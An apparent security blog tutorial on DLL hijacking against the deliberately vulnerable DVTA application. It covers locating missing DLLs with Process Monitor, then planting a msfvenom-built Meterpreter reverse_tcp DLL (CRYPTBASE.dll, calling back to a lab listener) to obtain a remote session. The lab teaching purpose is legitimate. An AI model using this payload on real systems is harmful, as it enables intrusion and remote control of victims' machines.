# DLL Hijacking
<!-- wp:paragraph -->
<p>Tools needed:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Windows virtual machine</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Kali linux</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>DVTA application</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Process Monitor</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>MSFVENOM</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>By taking advantage of the way some Windows applications look for and load Dynamic Link Libraries, a technique known as "DLL hijacking" allows malicious code to be injected into an application (DLL).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>This tutorial will showcase a simple DLL hijacking via the DVTA application. The application can be downloaded <a href="https://github.com/srini0x00/dvta/releases/tag/2.0" data-type="URL" data-id="https://github.com/srini0x00/dvta/releases/tag/2.0" target="_blank" rel="noreferrer noopener">here</a>. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4735,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-330.png?w=892" alt="" class="wp-image-4735"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Download the application to your windows machine before running the application start up process monitor.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><em>Process Monitor is a sophisticated Windows monitoring program that displays process/thread activity, file system activity, and registry activity in real time.</em></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Lets' run the DVTA application.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4714,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-318.png?w=796" alt="" class="wp-image-4714"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4733,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-329.png?w=537" alt="" class="wp-image-4733"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Disable the following tabs in the toolbar to reduce the noise of the process monitoring:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Show Registry activity</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Show Network activity</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4712,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-317.png?w=1024" alt="" class="wp-image-4712"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Once the application is executed , click filter in Process monitor and add the following filters:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Process Name is DVTA.exe</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Result is NAME NOT FOUND</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>PATH begins with &lt; <em>where the DVTA/bin/release folder is located in the machine</em>></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4716,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-319.png?w=607" alt="" class="wp-image-4716"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4717,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-320.png?w=605" alt="" class="wp-image-4717"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4719,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-321.png?w=603" alt="" class="wp-image-4719"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>We can see couple of DLLs that were used but not found during the execution of the application.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4721,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-322.png?w=1024" alt="" class="wp-image-4721"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4731,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-328.png?w=859" alt="" class="wp-image-4731"/><figcaption class="wp-element-caption">Check permissions on the victim machine.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let's craft a payload with the CRYPTBASE.dll</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Head to you attacking machine and use msfvenom to craft a payload </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4727,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-326.png?w=1024" alt="" class="wp-image-4727"/><figcaption class="wp-element-caption"><em>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.18.2 LPORT=4444 -f dll > CRYPTBASE.dll</em></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Transfer the payload to the DVTA folder by a python webserver.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4724,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-324.png?w=798" alt="" class="wp-image-4724"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let's set up a listener with msfconsole and use the multi handler exploit.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4729,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-327.png?w=1024" alt="" class="wp-image-4729"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Set the necessary options and run the exploit.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4723,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-323.png?w=440" alt="" class="wp-image-4723"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Head back to the victim machine and run the application again with the newly crafted payload inside the folder.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Check your attacking machine and a meterpreter session is gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4726,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/09/image-325.png?w=1024" alt="" class="wp-image-4726"/></figure>
<!-- /wp:image -->
